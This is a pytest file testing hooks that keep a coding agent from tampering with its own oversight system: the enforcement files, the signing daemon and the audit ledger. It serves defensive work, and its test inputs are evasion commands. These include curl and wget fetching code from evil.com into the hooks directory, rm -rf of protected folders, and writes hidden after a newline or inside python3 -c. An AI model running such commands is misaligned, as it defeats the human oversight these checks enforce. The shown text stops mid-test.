"""Integration tests for Sahjhan enforcement hooks.

Tests the hook scripts in enforcement/hooks/ using the correct
Claude Code output protocol (hookSpecificOutput with permissionDecision
for PreToolUse hooks, decision/reason for Stop hooks).
"""

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
ENFORCEMENT_HOOKS_DIR = os.path.join(REPO_ROOT, "enforcement", "hooks")


def run_enforcement_hook(hook_name, event, cwd=None, env=None):
    """Run an enforcement hook script with the given event JSON on stdin."""
    script = os.path.join(ENFORCEMENT_HOOKS_DIR, hook_name)
    result = subprocess.run(
        [sys.executable, script],
        input=json.dumps(event),
        capture_output=True,
        text=True,
        timeout=10,
        cwd=cwd or REPO_ROOT,
        env=env,
    )
    try:
        output = json.loads(result.stdout) if result.stdout.strip() else {}
    except json.JSONDecodeError:
        output = {}
    return result.returncode, output, result.stderr


def assert_allowed(code, output):
    """Assert that a PreToolUse hook allowed the operation."""
    assert code == 0, f"Expected exit 0, got {code}"
    assert output.get("continue") is True
    assert output.get("suppressOutput") is True


def assert_blocked(code, output, reason_substring=""):
    """Assert that a PreToolUse hook blocked the operation."""
    assert code == 0, f"Expected exit 0, got {code}"
    assert output.get("continue") is False
    hook_output = output.get("hookSpecificOutput", {})
    assert hook_output.get("permissionDecision") == "block", (
        f"Expected block, got: {hook_output}"
    )
    if reason_substring:
        reason = hook_output.get("permissionDecisionReason", "")
        assert reason_substring.lower() in reason.lower(), (
            f"Expected '{reason_substring}' in reason, got: {reason}"
        )


# --- _sahjhan_bootstrap.py (PreToolUse) ---


class TestBootstrapHook:
    """Tests for the self-protecting bootstrap hook."""

    def test_blocks_enforcement_directory(self):
        """Bootstrap hook blocks edits to enforcement/ directory."""
        event = {
            "tool_input": {"file_path": "enforcement/protocol.toml"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected enforcement infrastructure")

    def test_blocks_binary_modification(self):
        """Bootstrap hook blocks edits to bin/sahjhan*."""
        event = {
            "tool_input": {"file_path": "bin/sahjhan-aarch64-apple-darwin"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected enforcement infrastructure")

    def test_blocks_self_modification(self):
        """Bootstrap hook blocks edits to itself."""
        event = {
            "tool_input": {"file_path": "enforcement/hooks/_sahjhan_bootstrap.py"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected enforcement infrastructure")

    def test_blocks_hooks_json_modification(self):
        """Bootstrap hook blocks edits to hooks.json."""
        event = {
            "tool_input": {"file_path": "hooks/hooks.json"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected enforcement infrastructure")

    def test_allows_source_files(self):
        """Bootstrap hook allows normal source file edits."""
        event = {
            "tool_input": {"file_path": "skills/holtz/scripts/convergence_check.py"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_allowed(code, output)

    def test_allows_empty_path(self):
        """Bootstrap hook allows when no file path is provided."""
        event = {"tool_input": {}, "cwd": REPO_ROOT}
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_allowed(code, output)

    def test_bin_sahjhan_symlink_is_relative(self):
        """BH-003: bin/sahjhan symlink must be relative for CI compatibility.

        An absolute symlink works locally but breaks realpath comparison
        in CI where the repo is cloned to a different path.
        """
        link = os.path.join(REPO_ROOT, "bin", "sahjhan")
        if not os.path.islink(link):
            return  # not applicable if symlink doesn't exist
        target = os.readlink(link)
        assert not os.path.isabs(target), (
            f"bin/sahjhan symlink must be relative, got absolute: {target}"
        )

    def test_blocks_path_traversal(self):
        """Bootstrap hook blocks path traversal attempts to enforcement/."""
        event = {
            "tool_input": {"file_path": "../../enforcement/protocol.toml"},
            "cwd": os.path.join(REPO_ROOT, "docs", "holtz"),
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected enforcement infrastructure")

    def test_blocks_absolute_enforcement_path(self):
        """Bootstrap hook blocks absolute paths to enforcement/."""
        event = {
            "tool_input": {"file_path": os.path.join(REPO_ROOT, "enforcement", "states.toml")},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected enforcement infrastructure")

    def test_allows_enforcement_prefix_collision(self):
        """BH-014: Bootstrap allows enforcement_evil/ (prefix collision)."""
        event = {
            "tool_input": {"file_path": "enforcement_evil/bad.py"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_allowed(code, output)

    def test_blocks_write_enforcement_quiz_bank(self):
        """Write to enforcement/quiz-bank.json is still blocked (write protection)."""
        event = {
            "tool_name": "Write",
            "tool_input": {"file_path": "enforcement/quiz-bank.json"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected enforcement infrastructure")

    def test_allows_read_non_enforcement(self):
        """Bootstrap hook allows Read of non-enforcement paths."""
        event = {
            "tool_name": "Read",
            "tool_input": {"file_path": "docs/holtz/audit/test.md"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_allowed(code, output)

    def test_blocks_bash_sahjhan_sign(self):
        """Privileged sahjhan sign command must be blocked."""
        event = {
            "tool_input": {"command": "sahjhan sign --event-type quiz_answered"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "sahjhan sign")

    def test_blocks_bash_sahjhan_vault(self):
        """Privileged sahjhan vault command must be blocked."""
        event = {
            "tool_input": {"command": "sahjhan vault read --name quiz-bank"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "sahjhan vault")

    def test_blocks_bash_sahjhan_daemon_stop(self):
        """sahjhan daemon stop must be blocked (prevent agent killing daemon)."""
        event = {
            "tool_input": {"command": "sahjhan daemon stop"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "sahjhan daemon stop")

    def test_allows_bash_sahjhan_status(self):
        """Non-privileged sahjhan commands are allowed."""
        event = {
            "tool_input": {"command": "sahjhan status"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_allowed(code, output)

    def test_blocks_redirect_to_enforcement(self):
        """BH-008: Bootstrap blocks shell redirects targeting enforcement/."""
        event = {
            "tool_input": {"command": "echo bad > enforcement/protocol.toml"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected")

    def test_allows_redirect_mentioning_enforcement(self):
        """BH-008: Bootstrap allows redirects that mention but don't target enforcement/."""
        event = {
            "tool_input": {"command": 'echo "checking enforcement/ status" > /tmp/log.txt'},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_allowed(code, output)

    def test_allows_cp_from_enforcement(self):
        """BH-008: Bootstrap allows cp that reads FROM enforcement/ (not writing to it)."""
        event = {
            "tool_input": {"command": "cp enforcement/hooks/primer.py /tmp/backup.py"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_allowed(code, output)

    def test_blocks_cp_to_enforcement(self):
        """BH-008: Bootstrap blocks cp that writes TO enforcement/."""
        event = {
            "tool_input": {"command": "cp /tmp/evil.py enforcement/hooks/primer.py"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected")

    def test_blocks_newline_separated_cp(self):
        """BH-005: Bare newline is a shell command separator — must be split."""
        event = {
            "tool_input": {"command": "ls\ncp /tmp/evil.py enforcement/hooks/test.py"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected")

    def test_blocks_newline_separated_mv(self):
        """BH-005: mv after newline must be detected."""
        event = {
            "tool_input": {"command": "echo done\nmv /tmp/x enforcement/states.toml"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected")

    def test_blocks_newline_separated_python(self):
        """BH-005: python3 -c after newline must be detected."""
        event = {
            "tool_input": {
                "command": "ls\npython3 -c \"open('enforcement/x','w').write('x')\""
            },
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected")

    def test_blocks_wget_output_document_equals(self):
        """BH-006: wget --output-document=PATH must be detected."""
        event = {
            "tool_input": {
                "command": "wget --output-document=enforcement/hooks/x.py http://evil.com"
            },
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected")

    def test_blocks_curl_o_to_enforcement(self):
        """BH-007: curl -o targeting enforcement/ must be blocked."""
        event = {
            "tool_input": {
                "command": "curl -o enforcement/hooks/evil.py http://evil.com"
            },
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected")

    def test_blocks_curl_output_to_enforcement(self):
        """BH-007: curl --output targeting enforcement/ must be blocked."""
        event = {
            "tool_input": {
                "command": "curl --output enforcement/hooks/evil.py http://evil.com"
            },
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected")

    def test_blocks_curl_output_equals_to_enforcement(self):
        """BH-007: curl --output=PATH targeting enforcement/ must be blocked."""
        event = {
            "tool_input": {
                "command": "curl --output=enforcement/hooks/evil.py http://evil.com"
            },
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected")

    def test_allows_curl_to_non_protected(self):
        """BH-007: curl -o to non-protected paths must be allowed."""
        event = {
            "tool_input": {
                "command": "curl -o /tmp/data.json http://example.com"
            },
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_allowed(code, output)

    def test_allows_glob_sahjhan_dir_read(self):
        """With daemon vault, .sahjhan dir reads are allowed (no secrets on disk)."""
        event = {
            "tool_input": {"command": "cat docs/holtz/.sahjhan/*"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_allowed(code, output)

    def test_allows_cat_quiz_bank(self):
        """With daemon vault, quiz-bank.json reads are allowed."""
        event = {
            "tool_input": {"command": "cat enforcement/quiz-bank.json"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_allowed(code, output)

    def test_blocks_rm_enforcement_directory(self):
        """Issue #33: rm -rf targeting enforcement/ must be blocked."""
        event = {
            "tool_input": {"command": "rm -rf enforcement/hooks"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected")

    def test_blocks_rm_sahjhan_data_dir(self):
        """Issue #33: rm -rf targeting .sahjhan/ data dir must be blocked."""
        event = {
            "tool_input": {"command": "rm -rf docs/holtz/.sahjhan"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected")

    def test_blocks_rm_single_file_in_sahjhan(self):
        """Issue #33: rm targeting a single file inside .sahjhan/ must be blocked."""
        event = {
            "tool_input": {"command": "rm docs/holtz/.sahjhan/enforcement-cache.json"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected")

    def test_blocks_rmdir_enforcement(self):
        """Issue #33: rmdir targeting enforcement/ must be blocked."""
        event = {
            "tool_input": {"command": "rmdir enforcement/hooks"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected")

    def test_blocks_rm_chained_after_ls(self):
        """Issue #33: rm after shell operator must still be caught."""
        event = {
            "tool_input": {"command": "ls && rm -rf docs/holtz/.sahjhan"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected")

    def test_allows_rm_non_protected(self):
        """rm targeting non-protected paths must be allowed."""
        event = {
            "tool_input": {"command": "rm /tmp/scratch.txt"},
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_allowed(code, output)

    def test_blocks_python_write_to_sahjhan_cache(self):
        """Issue #33: python3 -c writing to enforcement-cache.json must be blocked."""
        event = {
            "tool_input": {
                "command": 'python3 -c "import json; open(\'docs/holtz/.sahjhan/enforcement-cache.json\',\'w\').write(\'{}\')"'
            },
            "cwd": REPO_ROOT,
        }
        code, output, _ = run_enforcement_hook("_sahjhan_bootstrap.py", event)
        assert_blocked(code, output, "protected")


# --- bash_guard.py (PostToolUse) ---


class TestBashGuard:
    """Tests for the Bash manifest verification guard."""

    def test_allows_without_sahjhan_binary(self):
        """Bash guard allows when no Sahjhan binary is installed."""
        event = {"tool_name": "Bash", "cwd": REPO_ROOT}
        code, output, _ = run_enforcement_hook("bash_guard.py", event)
        # Should allow since no binary exists yet
        assert code == 0
        assert output.get("continue") is True

    def test_allows_non_bash_tools(self):
        """Bash guard allows non-Bash tool calls."""
        event = {"tool_name": "Read", "cwd": REPO_ROOT}
        code, output, _ = run_enforcement_hook("bash_guard.py", event)
        assert code == 0
        assert output.get("continue") is True

    def test_violation_records_event_with_field_syntax(self, tmp_path):
        """BH-007/BH-013: Violation event uses --field key=value syntax."""
        # Set up mock binary that fails manifest verify and captures violation cmd
        (tmp_path / "docs" / "holtz" / ".sahjhan").mkdir(parents=True)
        (tmp_path / "enforcement").mkdir(parents=True)
        # Write enforcement cache with fresh timestamp for freshness gate
        import sys
        sys.path.insert(0, os.path.join(REPO_ROOT, "enforcement", "hooks"))
        from datetime import datetime, timezone

        from _protocol_cache import empty_cache, write_cache
        _cache = empty_cache()
        _cache["state"] = "fix_loop"
        _cache["last_sahjhan_cmd"] = datetime.now(timezone.utc).isoformat()  # noqa: UP017
        write_cache(str(tmp_path), _cache)
        log_file = tmp_path / "violation_cmd.log"
        _create_mock_binary(tmp_path, (
            'case "$*" in\n'
            '  *verify*)\n'
            '    echo "tampered" >&2\n'
            '    exit 1\n'
            '    ;;\n'
            '  *)\n'
            '    echo "$*" >> ' + str(log_file) + '\n'
            '    exit 0\n'
            '    ;;\n'
            'esac'
        ))
        event = {"tool_name": "Bash", "cwd": str(tmp_path)}
        run_enforcement_hook(
            "bash_guard.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        assert log_file.exists(), (
            "bash_guard should record a protocol_violation event when manifest verify fails"
        )
        logged = log_file.read_text()
        assert "--field" in logged, "violation event should use --field syntax"
        assert "project=holtz" in logged, "violation event missing project field"

    def test_skips_manifest_verify_for_sahjhan_commands(self, tmp_path):
        """BH-019: bash_guard skips manifest verification for sahjhan commands.

        Sahjhan commands are authorized to modify managed files (they render
        STATUS.md, PUNCHLIST.md from ledger state). Without this skip,
        sahjhan transitions trigger permanent protocol violations.
        """
        (tmp_path / "docs" / "holtz" / ".sahjhan").mkdir(parents=True)
        (tmp_path / "enforcement").mkdir(parents=True)
        # Create mock binary that would FAIL manifest verify
        _create_mock_binary(tmp_path, (
            'echo "tampered" >&2\n'
            'exit 1'
        ))
        # But the command is a sahjhan invocation — should be skipped entirely
        event = {
            "tool_name": "Bash",
            "tool_input": {"command": "./bin/sahjhan-aarch64-apple-darwin transition fix_commit BH-001"},
            "cwd": str(tmp_path),
        }
        code, output, _ = run_enforcement_hook(
            "bash_guard.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        assert code == 0, "bash_guard should skip verification for sahjhan commands"
        assert output.get("continue") is True

    def test_does_not_skip_for_chained_sahjhan(self, tmp_path):
        """BH-019: Chained commands with non-sahjhan segments still get checked."""
        (tmp_path / "docs" / "holtz" / ".sahjhan").mkdir(parents=True)
        (tmp_path / "enforcement").mkdir(parents=True)
        # Write enforcement cache with fresh timestamp for freshness gate
        import sys
        sys.path.insert(0, os.path.join(REPO_ROOT, "enforcement", "hooks"))
        from datetime import datetime, timezone

        from _protocol_cache import empty_cache, write_cache
        _cache = empty_cache()
        _cache["state"] = "fix_loop"
        _cache["last_sahjhan_cmd"] = datetime.now(timezone.utc).isoformat()  # noqa: UP017
        write_cache(str(tmp_path), _cache)
        _create_mock_binary(tmp_path, (
            'case "$*" in\n'
            '  *verify*)\n'
            '    echo "tampered" >&2\n'
            '    exit 1\n'
            '    ;;\n'
            '  *)\n'
            '    exit 0\n'
            '    ;;\n'
            'esac'
        ))
        # Non-sahjhan command chained with sahjhan — should NOT skip
        event = {
            "tool_name": "Bash",
            "tool_input": {"command": "cat foo.txt; sahjhan status"},
            "cwd": str(tmp_path),
        }
        code, output, _ = run_enforcement_hook(
            "bash_guard.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        # Should get the warning (manifest failed) since chained cmd is not pure sahjhan
        assert code == 0
        # exit_warn puts the message in additionalContext, not hookSpecificOutput
        assert "PROTOCOL VIOLATION" in output.get("additionalContext", ""), (
            "Expected PROTOCOL VIOLATION warning for non-pure-sahjhan chained command"
        )

    def test_degrades_gracefully_on_oserror(self, tmp_path):
        """BH-015: bash_guard degrades gracefully when binary is unexecutable."""
        (tmp_path / "docs" / "holtz" / ".sahjhan").mkdir(parents=True)
        (tmp_path / "enforcement").mkdir(parents=True)
        # Create binary that is not executable (triggers OSError)
        _create_mock_binary(tmp_path, "exit 0")
        binary_path = list((tmp_path / "bin").iterdir())[0]
        binary_path.chmod(0o000)
        event = {"tool_name": "Bash", "cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook(
            "bash_guard.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        binary_path.chmod(0o755)  # restore for cleanup
        assert code == 0, "bash_guard should degrade gracefully on OSError"
        assert output.get("continue") is True


# --- primer.py (UserPromptSubmit) ---


class TestPrimer:
    """Tests for the UserPromptSubmit primer hook."""

    def test_allows_without_sahjhan_binary(self, tmp_path):
        """Primer allows when no Sahjhan binary is installed.

        BH-005: Must use isolated tmp_path to avoid picking up live
        .sahjhan/ state from the repo root during active audit runs.
        """
        event = {"user_message": "continue", "cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook(
            "primer.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        assert code == 0
        assert output.get("continue") is True

    def test_allows_without_active_run(self, tmp_path):
        """Primer allows when no active Sahjhan run exists.

        BH-005: Must use isolated tmp_path to avoid picking up live state.
        """
        _create_mock_binary(tmp_path, 'echo "state: idle (1 events, chain valid)"')
        (tmp_path / "enforcement").mkdir(parents=True)
        event = {"user_message": "continue", "cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook(
            "primer.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        assert code == 0
        assert output.get("continue") is True

    def test_reset_records_event_with_field_syntax(self):
        """BH-008: Reset event uses authed-event with --field key=value syntax.

        With daemon-based signing, compute_event_proof connects to the daemon
        socket. This test sets up a mock Unix socket to serve sign requests.
        Uses a short temp path to stay within macOS AF_UNIX path limits.
        """
        import shutil
        import tempfile

        # macOS limits AF_UNIX paths to 104 bytes; use a short temp dir
        short_tmp = tempfile.mkdtemp(prefix="hz")
        tmp_path = Path(short_tmp)
        try:
            self._run_reset_test(tmp_path)
        finally:
            shutil.rmtree(short_tmp, ignore_errors=True)

    def _run_reset_test(self, tmp_path):
        import socket as socket_mod
        import threading

        sahjhan_dir = tmp_path / "docs" / "holtz" / ".sahjhan"
        sahjhan_dir.mkdir(parents=True)
        (tmp_path / "enforcement").mkdir(parents=True)
        # Write enforcement cache with fresh timestamp for freshness gate
        import sys
        sys.path.insert(0, os.path.join(REPO_ROOT, "enforcement", "hooks"))
        from datetime import datetime, timezone

        from _protocol_cache import empty_cache, write_cache
        _cache = empty_cache()
        _cache["state"] = "fix_loop"
        _cache["last_sahjhan_cmd"] = datetime.now(timezone.utc).isoformat()  # noqa: UP017
        write_cache(str(tmp_path), _cache)

        # Set up a mock daemon socket that responds to sign requests
        sock_path = str(sahjhan_dir / "daemon.sock")
        srv = socket_mod.socket(socket_mod.AF_UNIX, socket_mod.SOCK_STREAM)
        srv.bind(sock_path)
        srv.listen(1)
        srv.settimeout(5)

        def _serve():
            import json as _json
            try:
                conn, _ = srv.accept()
                data = conn.makefile().readline()
                req = _json.loads(data)
                if req.get("op") == "sign":
                    conn.sendall((_json.dumps({"ok": True, "proof": "deadbeef"}) + "\n").encode())
                conn.close()
            except Exception:
                pass

        # Start daemon mock in background (may need multiple connections)
        threads = [threading.Thread(target=_serve, daemon=True) for _ in range(3)]
        for t in threads:
            t.start()

        log_file = tmp_path / "reset_cmd.log"
        _create_mock_binary(tmp_path, (
            'echo "$*" >> ' + str(log_file) + '\n'
            'case "$*" in\n'
            '  *status*)\n'
            '    echo "state: fix_loop (10 events, chain valid)"\n'
            '    exit 0\n'
            '    ;;\n'
            'esac\n'
            'exit 0'
        ))
        event = {"user_message": "continue", "cwd": str(tmp_path)}
        run_enforcement_hook(
            "primer.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        srv.close()
        assert log_file.exists(), (
            "primer should record a context_reset event when active non-terminal run exists"
        )
        logged = log_file.read_text()
        assert "context_reset" in logged, "expected context_reset event in log"
        assert "authed-event" in logged, "reset event should use authed-event subcommand"
        assert "--field" in logged, "reset event should use --field syntax"
        assert "project=holtz" in logged, "reset event missing project field"

    def test_degrades_gracefully_on_oserror(self, tmp_path):
        """BH-015: primer degrades gracefully when binary is unexecutable."""
        (tmp_path / "docs" / "holtz" / ".sahjhan").mkdir(parents=True)
        _create_mock_binary(tmp_path, "exit 0")
        binary_path = list((tmp_path / "bin").iterdir())[0]
        binary_path.chmod(0o000)
        event = {"user_message": "continue", "cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook(
            "primer.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        binary_path.chmod(0o755)  # restore for cleanup
        assert code == 0, "primer should degrade gracefully on OSError"
        assert output.get("continue") is True

    def test_daemon_death_terminates_on_socket_failure(self):
        """When context_reset fails and init PID is dead, primer writes terminated marker.

        Uses a mock binary that returns valid status, but no daemon socket
        exists — so record_authed_event fails with OSError. The primer then
        checks daemon-init-pid, finds PID 99999999 is dead, and writes a
        terminated marker. No daemon restart is attempted.
        """
        import shutil
        import tempfile

        short_tmp = tempfile.mkdtemp(prefix="hz")
        tmp_path = Path(short_tmp)
        try:
            self._run_daemon_death_test(tmp_path)
        finally:
            shutil.rmtree(short_tmp, ignore_errors=True)

    def _run_daemon_death_test(self, tmp_path):
        from datetime import datetime, timezone

        sahjhan_dir = tmp_path / "docs" / "holtz" / ".sahjhan"
        sahjhan_dir.mkdir(parents=True)
        (tmp_path / "enforcement").mkdir(parents=True)

        sys.path.insert(0, os.path.join(REPO_ROOT, "enforcement", "hooks"))
        from _protocol_cache import empty_cache, write_cache
        _cache = empty_cache()
        _cache["state"] = "awaiting_clear"
        _cache["last_sahjhan_cmd"] = datetime.now(timezone.utc).isoformat()  # noqa: UP017
        write_cache(str(tmp_path), _cache)

        # Dead init PID — this is how primer detects daemon death
        (sahjhan_dir / "daemon-init-pid").write_text("99999999\n")
        (sahjhan_dir / "active-run").write_text("run-1\n")

        # Track calls to the mock binary
        log_file = tmp_path / "cmd.log"

        _create_mock_binary(tmp_path, (
            'echo "$*" >> ' + str(log_file) + '\n'
            'case "$*" in\n'
            '  *status*)\n'
            '    echo "state: awaiting_clear (10 events, chain valid)"\n'
            '    exit 0\n'
            '    ;;\n'
            'esac\n'
            'exit 0'
        ))

        # No daemon socket — record_authed_event will fail with OSError
        event = {"user_message": "continue", "cwd": str(tmp_path)}
        code, output, stderr = run_enforcement_hook(
            "primer.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )

        # Verify terminated marker was written (no restart attempted)
        assert (sahjhan_dir / "terminated").exists(), (
            "primer should write terminated marker when init PID is dead"
        )
        context = output.get("additionalContext", "")
        assert "AUDIT TERMINATED" in context, (
            "primer should inject termination message"
        )


# --- BH-004 (run 28): hooks.json configuration validation ---


def test_hooks_json_bootstrap_covers_bash():
    """BH-004: _sahjhan_bootstrap.py must fire for Bash PreToolUse.

    The bootstrap hook contains _check_bash_write and _bash_references_daemon_cmd
    which protect enforcement/ and managed docs from Bash writes, and block
    privileged sahjhan daemon commands (sign, vault, daemon stop). These
    functions are dead code unless hooks.json routes Bash events to the hook.
    """
    hooks_path = os.path.join(REPO_ROOT, "hooks", "hooks.json")
    with open(hooks_path, encoding="utf-8") as f:
        config = json.load(f)

    pre_tool_use = config.get("hooks", {}).get("PreToolUse", [])
    bash_hooks = []
    for entry in pre_tool_use:
        matcher = entry.get("matcher", "")
        if "Bash" in matcher:
            for hook in entry.get("hooks", []):
                bash_hooks.append(hook.get("command", ""))

    assert any("_sahjhan_bootstrap.py" in h for h in bash_hooks), (
        "hooks.json must include _sahjhan_bootstrap.py in Bash PreToolUse matcher. "
        "Without it, _check_bash_write and _bash_references_guarded are dead code — "
        "Bash writes to enforcement/ and managed docs are not preventively blocked."
    )


# --- BH-010: Bridge API sync test ---


def test_enforcement_common_bridge_exports_all_public():
    """BH-010: enforcement/_common.py must re-export all public names from hooks/_common.py.

    The bridge uses importlib to re-export specific names. This test catches
    future additions to hooks/_common.py that aren't added to the bridge.
    """
    import importlib.util

    hooks_common = os.path.join(REPO_ROOT, "hooks", "_common.py")
    spec = importlib.util.spec_from_file_location("hooks._common_test", hooks_common)
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)

    import types
    source_public = {
        n for n in dir(mod)
        if not n.startswith("_") and isinstance(getattr(mod, n), types.FunctionType)
    }
    enforcement_common = os.path.join(ENFORCEMENT_HOOKS_DIR, "_common.py")
    spec2 = importlib.util.spec_from_file_location("enf._common_test", enforcement_common)
    assert spec2 is not None and spec2.loader is not None
    mod2 = importlib.util.module_from_spec(spec2)
    spec2.loader.exec_module(mod2)

    bridge_public = {
        n for n in dir(mod2)
        if not n.startswith("_") and callable(getattr(mod2, n))
    }
    missing = source_public - bridge_public
    assert not missing, (
        f"enforcement/_common.py bridge is missing re-exports: {missing}. "
        f"Add them to the bridge's re-export list."
    )


# --- _active_ledger (enforcement/hooks/_common.py) ---


def _mock_env(tmp_path):
    """Return env dict with CLAUDE_PLUGIN_ROOT pointing to tmp_path."""
    env = os.environ.copy()
    env["CLAUDE_PLUGIN_ROOT"] = str(tmp_path)
    return env


def _create_mock_binary(tmp_path, script_body):
    """Create a mock sahjhan binary at the expected platform path."""
    import platform
    arch = platform.machine()
    if arch == "arm64":
        arch = "aarch64"
    system = platform.system().lower()
    triple = {"darwin": f"{arch}-apple-darwin", "linux": f"{arch}-unknown-linux-gnu"}.get(
        system, f"{arch}-{system}"
    )
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir(exist_ok=True)
    mock_binary = bin_dir / f"sahjhan-{triple}"
    mock_binary.write_text(f"#!/bin/sh\n{script_body}\n")
    mock_binary.chmod(0o755)


class TestBashGuardWithMockBinary:
    """BH-010: Tests that exercise actual bash_guard logic with a mock binary."""

    def _setup(self, tmp_path, verify_exit=0, verify_stderr=""):
        (tmp_path / "docs" / "holtz" / ".sahjhan").mkdir(parents=True)
        (tmp_path / "enforcement").mkdir(parents=True)
        # Write enforcement cache with fresh timestamp for freshness gate
        import sys
        sys.path.insert(0, os.path.join(REPO_ROOT, "enforcement", "hooks"))
        from datetime import datetime, timezone

        from _protocol_cache import empty_cache, write_cache
        _cache = empty_cache()
        _cache["state"] = "fix_loop"
        _cache["last_sahjhan_cmd"] = datetime.now(timezone.utc).isoformat()  # noqa: UP017
        write_cache(str(tmp_path), _cache)
        _create_mock_binary(tmp_path, (
            f'if echo "$@" | grep -q "verify"; then\n'
            f'  echo "{verify_stderr}" >&2\n'
            f'  exit {verify_exit}\n'
            f'fi\n'
            f'exit 0'
        ))

    def test_allows_clean_manifest(self, tmp_path):
        """Bash guard allows when manifest verify passes."""
        self._setup(tmp_path, verify_exit=0)
        event = {"tool_name": "Bash", "cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook(
            "bash_guard.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        assert code == 0
        assert output.get("continue") is True

    def test_warns_on_manifest_violation(self, tmp_path):
        """Bash guard warns when manifest verify fails."""
        self._setup(tmp_path, verify_exit=1, verify_stderr="tampered")
        event = {"tool_name": "Bash", "cwd": str(tmp_path)}
        code, output, _ = run_enforcement_hook(
            "bash_guard.py", event, cwd=str(tmp_path), env=_mock_env(tmp_path)
        )
        assert code == 0
        # exit_warn puts the message in additionalContext
